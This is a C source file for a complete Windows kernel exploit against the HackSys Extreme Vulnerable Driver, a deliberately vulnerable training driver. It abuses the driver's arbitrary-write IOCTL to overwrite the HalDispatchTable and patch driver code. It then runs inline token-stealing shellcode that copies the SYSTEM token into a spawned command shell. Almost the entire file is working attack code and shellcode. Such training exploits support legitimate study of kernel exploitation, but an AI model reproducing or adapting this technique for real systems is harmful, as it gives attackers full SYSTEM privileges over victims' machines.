#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <winioctl.h>
#include <psapi.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>

#define HACKSYS_EVD_IOCTL_ARBITRARY_WRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
#define device "\\\\.\\HackSysExtremeVulnerableDriver"

typedef NTSTATUS (NTAPI *_NtQueryIntervalProfile)(
				IN ULONG ProfileSource,
				OUT PULONG Interval
				);

DWORD PID = 0;

HANDLE get_handle()
{
		HANDLE h = CreateFileA(device,
						FILE_READ_ACCESS | FILE_WRITE_ACCESS,
						FILE_SHARE_READ | FILE_SHARE_WRITE,
						NULL,
						OPEN_EXISTING,
						FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, 
						NULL);
		if( h == INVALID_HANDLE_VALUE ) 
		{
				printf("[!] fatal: Unable to get a HANDLE to the driver\n");
				exit(-1);
		}
		return h;
}

void test()
{
		__asm__(
						"push rax;"
						"push rbx;"
						"push rcx;"
						"push rdx;"
						"push rsi;"
						"push rdi;"
								
						"mov rax, 0;"
						"mov rax, gs:[rax + 32];" 	//get addr of _KPRCB
						"add rax, 8;"				//offset to currentThread
						"mov rbx, [rax];"

						"add rbx, 152;"				//offset to apcState
						"mov rax, [rbx];"

						"add rax, 32;"				//offset to Process aka _EPROCESS
						"mov rbx, [rax];"

						"mov rcx, rbx;"
						"mov rdx, rcx;"
						"jmp search;"
						"search:"
						"mov rcx, rdx;"				//restore base _EPROCESS
						"add rcx, 752;"				//offset to ActiveProcessLinks
						"xor rdx, rdx;"
						"mov rdx, [rcx];"			//mov flink to rdx

						"sub rdx, 752;"				//get offset to base _EPROCESS

						"mov rcx, [rdx+744];"		//get offset to UniqueProcessId
						"cmp rcx, 6969;"			//compare with PID. Will be overwritten from the exploit
						"je found;"
						"jmp search;"
						
						"found:"
						"mov rsi, rdx;"
						
						"jmp sysProc;"
						"sysProc:"
						"mov rcx, rdx;"
						"add rcx, 752;"
						"mov rdx, [rcx];"

						"sub rdx, 752;"

						"mov rcx, [rdx+744];"
						"cmp rcx, 4;"
						"je copyToken;"
						"jmp sysProc;"
						
						"copyToken:"
						"mov rdi, rdx;"
						"mov rcx, [rdi + 864];"		//offset to _TOKEN
						"mov [rsi + 864], rcx;"
						
						"pop rax;"
						"pop rbx;"
						"pop rcx;"
						"pop rdx;"
						"pop rsi;"
						"pop rdi;"

						"pop rbp;"
						"ret;"
						
			   );
}

unsigned long long kernelBase(void) //thx to Connor McGarr
{
		LPVOID lpImagebase[1024];
		DWORD lpcbRequired;
		
		printf( "\n[!] Admin required Else the resolved Address will be null\n\n" );

		printf("[+] Calling EnumDeviceDrivers() . . .\n");

		BOOL baseOfDrivers = EnumDeviceDrivers(lpImagebase, sizeof(lpImagebase), &lpcbRequired);

		if(! baseOfDrivers )
		{
				printf( "[-] fatal: Unable to call. Last ErrorMsg: %d\n", GetLastError() );
				exit(1);
		}
		unsigned long long kernelBaseAddr = (unsigned long long)lpImagebase[0];

		printf( "[+] KernelBase: 0x%llx\n", kernelBaseAddr );

		return kernelBaseAddr;
}

unsigned long long HDTbase(unsigned long long krnlBase)
{
		unsigned long long table = ( krnlBase + 0x423258 );
	
		printf("[+] HalDispatchTable: 0x%llx\n", table );

		return table;
}

unsigned long long HEVDbase(void)
{
		LPVOID lpImagebase[1024];
		DWORD lpcbRequired;
		char lpFilename[1024];

		printf("[+] Calling EnumDeviceDrivers() . . .\n");
		
		BOOL baseOfDrivers = EnumDeviceDrivers(lpImagebase, sizeof(lpImagebase), &lpcbRequired);

		if(! baseOfDrivers )
		{
				printf( "[-] fatal: Unable to call. Last ErrorMsg: %d\n", GetLastError() );
				exit(1);
		}
		unsigned long long HEVD_BaseAddr;
		char name[9] = "HEVD.sys";
		for( int i = 0; i < (lpcbRequired / sizeof(LPVOID)); i++ )
		{
				GetDeviceDriverBaseNameA(lpImagebase[i], lpFilename, 1024);
				if( strcmp(lpFilename, name) == 0 )
				{
						HEVD_BaseAddr = (unsigned long long)lpImagebase[i];
						printf( "[+] HEVD!Base: 0x%llx\n", HEVD_BaseAddr );
						return HEVD_BaseAddr;
				}
				else {
						continue;
				}
		}
		printf("[-] fatal: Unable to get base address of HEVD.sys\n");
		exit(-1);
}

bool createCmd()
{
		STARTUPINFOA start;
		PROCESS_INFORMATION pi;
		memset(&start, 0, sizeof(STARTUPINFOA) );
		memset(&pi, 0, sizeof(PROCESS_INFORMATION) );

		start.cb = sizeof(STARTUPINFOA);

		if( !CreateProcessA(NULL,
								"cmd.exe",
								NULL,
								NULL,
								true,
								CREATE_NEW_CONSOLE,
								NULL,
								NULL,
								&start,
								&pi) )
		{
				printf("[-] error: Unable to spawn a new cmd :/\nLast ErrorMsg: %d\n", GetLastError() );
				return false;
		}
		PID = pi.dwProcessId;
		return true;
}

unsigned long long safeTheHal = 0;

void safeHdt(unsigned long long hdt, HANDLE h)
{
		PULONG payload = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(PULONG_PTR) * 2) );
		SIZE_T s = (sizeof(PULONG_PTR) *2);
		DWORD old;
	
		printf("[+] Safing the HalDispatchTable . . .\n");
		
		if(! VirtualProtect(&safeTheHal, 4096, PAGE_EXECUTE_READWRITE, &old) )
		{
				printf("[-] fatal: Memory protection\n");
				exit(1);
		}
		
		*(unsigned long long*)payload = (unsigned long long)hdt;
		*((unsigned long long*)((char*)payload+8)) = (unsigned long long)&safeTheHal;
		
		bool response = DeviceIoControl(h, HACKSYS_EVD_IOCTL_ARBITRARY_WRITE, payload, (DWORD)s, NULL, 0, NULL, NULL);
		if(! response ) 
		{
				printf("[-] fatal: Unable to communicate with driver\n");
				exit(-1);
		}

		printf("[+] Value of the HalDispatchTable: 0x%llx\n", safeTheHal);
		return;
}

void change(unsigned long long hdt, HANDLE h, unsigned long long hevdEntry) 
{
		PULONG payload = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(PULONG_PTR) * 2) );
		SIZE_T s = (sizeof(PULONG_PTR) *2);
		DWORD old;

		printf("[+] Overwriting HalDispatchTable . . .\n");
		sleep(3);	
		void (*fp)();
		fp = test;

		unsigned char *code = (unsigned char*)test;

		if(! VirtualProtect( code, 4096, PAGE_EXECUTE_READWRITE, &old))
		{
				printf("[-] fatal: Memory protection\n");
				exit(-12);
		}

		unsigned long long what = (unsigned long long)&hevdEntry;
		unsigned long long where = (unsigned long long)hdt;
		
		//transfer addresses in the format
		*(unsigned long long*)payload = (unsigned long long)what; 				//address of the Shellcode
		*((unsigned long long*)((char*)payload+8)) = (unsigned long long)where;	//address of the HalDispatchTable
		
		printf("[+] 'what' = 0x%llx\n", what);
		printf("[+] 'where' = 0x%llx\n", where);
		printf("[+] 'paylaod' = 0x%llx + 0x%llx\n", *(unsigned long long*)payload, *((unsigned long long*)((char*)payload+8)));
		
		void *cmp = fp+87;
		printf("[+] Memory: Setting new PID:%llu\n", PID);
		*(int*)cmp = PID;

		bool response = DeviceIoControl(h, HACKSYS_EVD_IOCTL_ARBITRARY_WRITE, payload, (DWORD)s, NULL, 0, NULL, NULL);
		if(! response ) 
		{
				printf("[-] fatal: Cant communicate with driver\n");
				exit(-1);
		}
		return;
}

void restore(unsigned long long hdt, HANDLE h)
{
		PULONG payload = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(PULONG_PTR) * 2) );
		SIZE_T s = (sizeof(PULONG_PTR) *2);
		DWORD old;

		printf("[+] Restoring the HalDispatchTable . . .\n");

		*(unsigned long long*)payload = (unsigned long long)&safeTheHal;
		*((unsigned long long*)((char*)payload+8)) = (unsigned long long)hdt;

		bool response = DeviceIoControl(h, HACKSYS_EVD_IOCTL_ARBITRARY_WRITE, payload, (DWORD)s, NULL, 0, NULL, NULL);
		if(! response ) 
		{
				printf("[-] fatal: Cant communicate with driver\n");
				exit(-1);
		}

		return;
}

void exploit()
{
		HMODULE hntdll = GetModuleHandle("ntdll.dll");
		if( hntdll == NULL )
		{
				printf("[-] error: Cant load ntdll.dll\n");
				return;
		}

		_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(hntdll, "NtQueryIntervalProfile");
		if( NtQueryIntervalProfile == NULL )
		{
				printf("[-] error: Unable to locate NtQueryIntervalProfile! Last ErrorMsg: %d\n", GetLastError() );
				exit(-1);
		}

		ULONG var = 0;
		printf("[+] Exploitation in 3");
		for( int i = 0; i < 8; i++ )
		{
				if( i == 3 || i == 7 )
				{
						if( i == 3 )
								printf("2");
						else
						{
								printf("1");
								i = 5;
								usleep(300000);
								while ( i < 8 )
								{
										printf(".");
										usleep(300000);
										i+=1;
								}
						}
				}
				else
				{
						printf(".");
						usleep(300000);
				}
		}

		NtQueryIntervalProfile(2, &var);
		return;
}

unsigned long long little_endian(unsigned long long value)
{
		return ((value & 0x00000000000000FFULL) << 56) |
           ((value & 0x000000000000FF00ULL) << 40) |
           ((value & 0x0000000000FF0000ULL) << 24) |
           ((value & 0x00000000FF000000ULL) << 8)  |
           ((value & 0x000000FF00000000ULL) >> 8)  |
           ((value & 0x0000FF0000000000ULL) >> 24) |
           ((value & 0x00FF000000000000ULL) >> 40) |
           ((value & 0xFF00000000000000ULL) >> 56);
}

void changeHEVD(unsigned long long hevdEntry, HANDLE h)
{
		PULONG payload = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(PULONG_PTR) * 2) );
		SIZE_T s = (sizeof(PULONG_PTR) *2);
		DWORD old;
		void (*fp)();
		fp = test;

		//mov rax, <64bit address>
		char buf[2] = "\x48\xB8";

		unsigned long long what = (unsigned long long)&buf; 
		unsigned long long where = (unsigned long long)(hevdEntry);

		*(unsigned long long*)payload = (unsigned long long)what;
		*((unsigned long long*)((char*)payload+8)) = (unsigned long long)where;

		bool response = DeviceIoControl(h, HACKSYS_EVD_IOCTL_ARBITRARY_WRITE, payload, (DWORD)s, NULL, 0, NULL, NULL);
		if(! response ) 
		{
				printf("[-] fatal: Cant communicate with driver\n");
				exit(-1);
		}
		
		// 64bit address
		char buff[8] = {0};
		void *cmp = buff;
		*(unsigned long long*)cmp = (unsigned long long)fp;
		what = (unsigned long long)&buff; 						//little_endian((unsigned long long)cmp)
		where = (unsigned long long)(hevdEntry + 0x02); 

		*(unsigned long long*)payload = (unsigned long long)what;
		*((unsigned long long*)((char*)payload+8)) = (unsigned long long)where;
		
		response = DeviceIoControl(h, HACKSYS_EVD_IOCTL_ARBITRARY_WRITE, payload, (DWORD)s, NULL, 0, NULL, NULL);
		if(! response ) 
		{
				printf("[-] fatal: Cant communicate with driver\n");
				exit(-1);
		}

		//jmp to fp
		char buf2[2] = "\xFF\xE0";
		what = (unsigned long long)&buf2;
		where = (unsigned long long)(hevdEntry + 0x0a);

		*(unsigned long long*)payload = (unsigned long long)what;
		*((unsigned long long*)((char*)payload+8)) = (unsigned long long)where;
		
		response = DeviceIoControl(h, HACKSYS_EVD_IOCTL_ARBITRARY_WRITE, payload, (DWORD)s, NULL, 0, NULL, NULL);
		if(! response ) 
		{
				printf("[-] fatal: Cant communicate with driver\n");
				exit(-1);
		}
		return;
}

int main(void)
{
		HANDLE h = get_handle();
		unsigned long long krnlBase = kernelBase();
		unsigned long long hdtbase = HDTbase(krnlBase);
		unsigned long long hevdBase = HEVDbase(); //offset to 'TriggerBufferOverflowStack()' = 0x865e4
		unsigned long long hevdEntry = (hevdBase+0x865e4);
		if(! createCmd() )
		{
				exit(1);
		}
		printf("\n[!] Part 1 . . .\n");
		safeHdt(hdtbase, h);
		printf("\n[!] Part 2 . . .\n");
		change(hdtbase, h, hevdEntry);
		changeHEVD(hevdEntry, h);
		printf("\n[!] Part 3 . . .\n");
		exploit();
		printf("\n[!] Part 4 . . .\n");
		restore(hdtbase, h);

		system("pause");
		printf( "[!] exit: Closing the program\n" ); 
		return 0;
}


